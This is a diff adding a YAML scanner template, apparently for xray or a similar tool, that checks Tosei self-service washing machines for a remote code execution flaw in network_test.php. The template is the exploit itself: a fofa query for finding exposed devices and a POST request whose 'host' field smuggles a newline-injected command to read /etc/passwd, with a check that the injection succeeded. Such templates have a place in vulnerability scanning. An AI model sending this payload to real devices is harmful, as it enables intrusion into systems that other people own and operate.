@@ -1,0 +1,18 @@
+id: poc-yaml-tosei-self-service-washing-machine-test-php-rce
+info:
+  name: Tosei 自助洗衣机 network_test.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: tosei 自助洗衣机
+  fofa: body="tosei_login_check.php"
+requests:
+- method: POST
+  path: /cgi-bin/network_test.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: host=%0acat${IFS}/etc/passwd%0a&command=ping
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"ping")
+variables: {}
+transport: http
